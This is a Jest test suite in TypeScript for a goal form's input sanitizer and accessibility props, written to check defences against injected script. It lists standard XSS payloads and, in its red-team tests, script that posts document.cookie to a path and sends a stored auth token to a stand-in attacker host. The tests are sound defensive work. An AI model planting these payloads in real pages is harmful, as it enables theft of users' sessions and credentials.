// __tests__/security/SecurityTestSuite.ts
import { advancedSanitize, createSecureAccessibilityProps } from '../../components/CreateGoalForm';

describe('Security Test Suite', () => {
  describe('XSS Protection', () => {
    const XSS_PAYLOADS = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '"><script>alert("xss")</script>',
      "';alert('xss');//",
      '<svg/onload=alert("xss")>',
      'data:text/html,<script>alert("xss")</script>',
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<object data="javascript:alert(\'xss\')"></object>',
      '<embed src="javascript:alert(\'xss\')">',
    ] as const;

    test.each(XSS_PAYLOADS)('should sanitize XSS payload: %s', (payload) => {
      const sanitized = advancedSanitize(payload);
      
      // Should not contain dangerous patterns
      expect(sanitized).not.toMatch(/<script/i);
      expect(sanitized).not.toMatch(/javascript:/i);
      expect(sanitized).not.toMatch(/onerror=/i);
      expect(sanitized).not.toMatch(/<iframe/i);
      expect(sanitized).not.toMatch(/<object/i);
      expect(sanitized).not.toMatch(/<embed/i);
      
      // Log for manual verification
      console.log(`Original: ${payload}`);
      console.log(`Sanitized: ${sanitized}`);
      console.log('---');
    });

    test('should preserve safe content', () => {
      const safeInputs = [
        'Regular goal title',
        'Goal with numbers 123',
        'Goal with special chars: !@#$%^&*()',
        'Goal with unicode: 🎯 健康 目标',
        'Goal with line breaks\nand tabs\t',
      ];

      safeInputs.forEach(input => {
        const sanitized = advancedSanitize(input);
        // Should preserve most of the content
        expect(sanitized.length).toBeGreaterThan(0);
        expect(sanitized).not.toMatch(/[<>]/);
      });
    });
  });

  describe('Input Length Validation', () => {
    test('should enforce maximum lengths', () => {
      const longInput = 'A'.repeat(1000);
      
      const sanitizedTitle = advancedSanitize(longInput);
      expect(sanitizedTitle.length).toBeLessThanOrEqual(100);
      
      // Should truncate gracefully
      expect(sanitizedTitle).toMatch(/^A+$/);
    });

    test('should handle empty inputs', () => {
      expect(advancedSanitize('')).toBe('');
      expect(advancedSanitize('   ')).toBe('');
      expect(advancedSanitize('\t\n\r')).toBe('');
    });
  });

  describe('Unicode Security', () => {
    test('should handle malicious unicode', () => {
      const unicodeAttacks = [
        '\u0000\u0001\u0002', // Null bytes
        '\u007f\u008f\u009f', // Control characters
        '\ufeff\u200b\u200c', // Zero-width characters
        '\u202e\u202d', // Text direction override
      ];

      unicodeAttacks.forEach(attack => {
        const sanitized = advancedSanitize(attack);
        expect(sanitized).toBe(''); // Should be completely removed
      });
    });
  });
});

describe('Accessibility Security Tests', () => {
  describe('Secure Accessibility Props', () => {
    test('should sanitize accessibility labels', () => {
      const maliciousLabel = '<script>alert("a11y exploit")</script>Goal Title';
      const maliciousHint = 'javascript:steal_data()Enter your goal';
      
      const props = createSecureAccessibilityProps(maliciousLabel, maliciousHint, true);
      
      expect(props.accessibilityLabel).not.toMatch(/<script/);
      expect(props.accessibilityLabel).not.toMatch(/javascript:/);
      expect(props.accessibilityHint).not.toMatch(/javascript:/);
      
      // Should still contain useful content
      expect(props.accessibilityLabel).toContain('Goal Title');
      expect(props.accessibilityHint).toContain('Enter your goal');
      
      // Should have security properties
      expect(props.accessibilityLiveRegion).toBe('none');
      expect(props.accessibilityRequired).toBe(true);
    });

    test('should enforce length limits on accessibility strings', () => {
      const longLabel = 'A'.repeat(200);
      const longHint = 'B'.repeat(500);
      
      const props = createSecureAccessibilityProps(longLabel, longHint);
      
      expect(props.accessibilityLabel.length).toBeLessThanOrEqual(100);
      expect(props.accessibilityHint?.length).toBeLessThanOrEqual(200);
    });

    test('should handle missing hint gracefully', () => {
      const props = createSecureAccessibilityProps('Test Label');
      
      expect(props.accessibilityLabel).toBe('Test Label');
      expect(props.accessibilityHint).toBeUndefined();
      expect(props.accessibilityRequired).toBe(false);
    });
  });
});

describe('Form Security Integration Tests', () => {
  test('should validate complete form submission', () => {
    const maliciousFormData = {
      title: '<script>alert("title")</script>My Goal',
      description: 'javascript:alert("desc")Goal description',
      tags: ['<img onerror=alert("tag")>urgent', 'normal-tag'],
    };

    // Simulate form processing
    const sanitizedTitle = advancedSanitize(maliciousFormData.title);
    const sanitizedDescription = advancedSanitize(maliciousFormData.description);
    const sanitizedTags = maliciousFormData.tags
      .map(tag => advancedSanitize(tag))
      .filter(tag => tag.length > 0)
      .slice(0, 10);

    // Verify all dangerous content removed
    expect(sanitizedTitle).not.toMatch(/<script/);
    expect(sanitizedTitle).toContain('My Goal');
    
    expect(sanitizedDescription).not.toMatch(/javascript:/);
    expect(sanitizedDescription).toContain('Goal description');
    
    expect(sanitizedTags).toHaveLength(2);
    expect(sanitizedTags[0]).not.toMatch(/<img/);
    expect(sanitizedTags[0]).toContain('urgent');
    expect(sanitizedTags[1]).toBe('normal-tag');
  });
});

describe('Performance Security Tests', () => {
  test('should handle large inputs efficiently', () => {
    const startTime = performance.now();
    const largeInput = 'A'.repeat(10000);
    
    const sanitized = advancedSanitize(largeInput);
    
    const endTime = performance.now();
    const processingTime = endTime - startTime;
    
    // Should process quickly (under 10ms)
    expect(processingTime).toBeLessThan(10);
    
    // Should enforce limits
    expect(sanitized.length).toBeLessThanOrEqual(100);
  });

  test('should prevent DoS through regex', () => {
    // Test for ReDoS vulnerabilities
    const complexInput = '(' + 'a'.repeat(100) + ')*' + 'b'.repeat(100);
    
    const startTime = performance.now();
    const sanitized = advancedSanitize(complexInput);
    const endTime = performance.now();
    
    // Should not hang due to regex complexity
    expect(endTime - startTime).toBeLessThan(100);
    expect(sanitized).toBeDefined();
  });
});

// Red Team Simulation Tests
describe('Red Team Attack Simulations', () => {
  test('Scenario 1: Persistent XSS through form persistence', () => {
    // Simulate attacker trying to persist XSS in form drafts
    const attackPayload = '<script>setInterval(() => fetch("/steal-data", {method: "POST", body: document.cookie}), 1000)</script>';
    
    const sanitized = advancedSanitize(attackPayload);
    
    // Should be completely neutralized
    expect(sanitized).not.toMatch(/<script/);
    expect(sanitized).not.toMatch(/setInterval/);
    expect(sanitized).not.toMatch(/fetch/);
    
    // Verify no executable content remains
    expect(sanitized).toMatch(/^[^<>]*$/);
  });

  test('Scenario 2: Social engineering through accessibility', () => {
    // Attacker tries to use accessibility props for social engineering
    const maliciousLabel = 'Click here to verify your password: http://evil-site.com';
    const props = createSecureAccessibilityProps(maliciousLabel);
    
    // Should not contain URLs or suspicious content
    expect(props.accessibilityLabel).not.toMatch(/http/);
    expect(props.accessibilityLabel).not.toMatch(/password/);
    
    // Should be limited in length to prevent abuse
    expect(props.accessibilityLabel.length).toBeLessThanOrEqual(100);
  });

  test('Scenario 3: Data exfiltration through tags', () => {
    // Attacker tries to exfiltrate data through tag manipulation
    const exfilTags = [
      'normal-tag',
      '<script>fetch("http://attacker.com/steal?data=" + localStorage.getItem("authToken"))</script>',
      'another-normal-tag'
    ];

    const sanitizedTags = exfilTags
      .map(tag => advancedSanitize(tag))
      .filter(tag => tag.length > 0);

    // Should preserve legitimate tags
    expect(sanitizedTags).toContain('normal-tag');
    expect(sanitizedTags).toContain('another-normal-tag');

    // Should remove malicious tag completely
    const maliciousTagSanitized = sanitizedTags.find(tag => 
      tag.includes('script') || tag.includes('fetch') || tag.includes('localStorage')
    );
    expect(maliciousTagSanitized).toBeUndefined();
  });
});

// Accessibility Compliance Tests
describe('WCAG 2.1 AA Compliance', () => {
  test('should meet minimum accessibility requirements', () => {
    const testCases = [
      { label: 'Goal Title', hint: 'Enter your goal title', required: true },
      { label: 'Priority Level', hint: 'Select priority level', required: false },
      { label: 'Target Date', hint: 'Choose target completion date', required: false },
    ];

    testCases.forEach(({ label, hint, required }) => {
      const props = createSecureAccessibilityProps(label, hint, required);
      
      // Should have proper accessibility label
      expect(props.accessibilityLabel).toBeTruthy();
      expect(props.accessibilityLabel.length).toBeGreaterThan(0);
      
      // Should have hint if provided
      if (hint) {
        expect(props.accessibilityHint).toBeTruthy();
      }
      
      // Should indicate required status
      expect(props.accessibilityRequired).toBe(required);
      
      // Should prevent live region exploitation
      expect(props.accessibilityLiveRegion).toBe('none');
    });
  });
});

export {};
